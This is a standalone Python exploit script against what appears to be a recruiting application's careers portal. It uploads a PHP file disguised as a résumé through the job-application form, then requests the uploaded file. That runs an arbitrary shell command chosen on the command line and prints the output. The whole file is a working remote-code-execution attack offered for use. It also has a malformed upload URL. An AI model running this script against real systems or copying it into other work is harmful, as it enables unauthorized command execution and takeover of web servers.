import requests
from bs4 import BeautifulSoup
import random
import string

import sys


def exploit(parmUrl,cmd):
    # Define the URL to scrape
    url = f"{parmUrl}/careers/index.php?m=careers&p=showAll"
    url1=f"{parmUrl}/careers/index.php?m=careers&p=showJob&ID=1"
    host=parmUrl.split('//')[1]

    headers = {
        'Host': f"{host}",
        'Origin': f"{parmUrl}",
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryezy5JAeYId7gpX36',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    }

    params = {
        'm': 'careers',
        'p': 'onApplyToJobOrder',
    }


    # Send an HTTP GET request to the URL
    response = requests.get(url)

    # Check if the request was successful (status code 200)
    if response.status_code == 200:
        # Parse the HTML content using BeautifulSoup
        soup = BeautifulSoup(response.text, 'html.parser')
        # Find the elements containing the desired text
        openings_element = soup.find('div', {'id': 'careerContent'}).find('h1')
        print(openings_element.text.strip())
        # Current Available Openings, Recently Posted Jobs: 1
        availableJobs=int(openings_element.text.strip().split(': ')[1])
        if availableJobs > 0:
            print(f"total jobs are: {availableJobs}")
            print(f"Trying to upload revshell to {availableJobs} job id")
            filename="".join(random.choices(string.ascii_lowercase,k=10))
            data = '------WebKitFormBoundaryezy5JAeYId7gpX36\r\nContent-Disposition: form-data; name="ID"\r\n\r\n'+str(availableJobs)+'\r\n------WebKitFormBoundaryezy5JAeYId7gpX36\r\nContent-Disposition: form-data; name="candidateID"\r\n\r\n-1\r\n------WebKitFormBoundaryezy5JAeYId7gpX36\r\nContent-Disposition: form-data; name="applyToJobSubAction"\r\n\r\nresumeLoad\r\n------WebKitFormBoundaryezy5JAeYId7gpX36\r\nContent-Disposition: form-data; name="file"\r\n\r\n'+filename+'.php\r\n------WebKitFormBoundaryezy5JAeYId7gpX36\r\nContent-Disposition: form-data; name="resumeFile"; filename="'+filename+'.php"\r\nContent-Type: application/x-php\r\n\r\n<?php system("'+cmd+'");?>\r\n------WebKitFormBoundaryezy5JAeYId7gpX36--\r\n'
            response1= requests.post(
                f"{url}/careers/index.php",
                params=params,
                headers=headers,
                data=data,
                verify=False,
            )
            if response1.status_code == 200:
                if "will still be uploaded" in response1.text:
                    print("[*] Exploit Uploaded successfully")
                    id=requests.get(f"{parmUrl}/upload/careerportaladd/{filename}.php")
                    print(id.text)
                    print(f"{parmUrl}/upload/careerportaladd/{filename}.php")
            else:
                print("unable to exploit the server", response.status_code)
    else:
        print("Failed to retrieve the webpage. Status code:", response.status_code)


if __name__ == "__main__":
    n = len(sys.argv)
    if n<3:
        print("python3 exploit.py url cmd")
    else:
        url=sys.argv[1]
        cmd=sys.argv[2]
        print(url,cmd)
        exploit(url,cmd)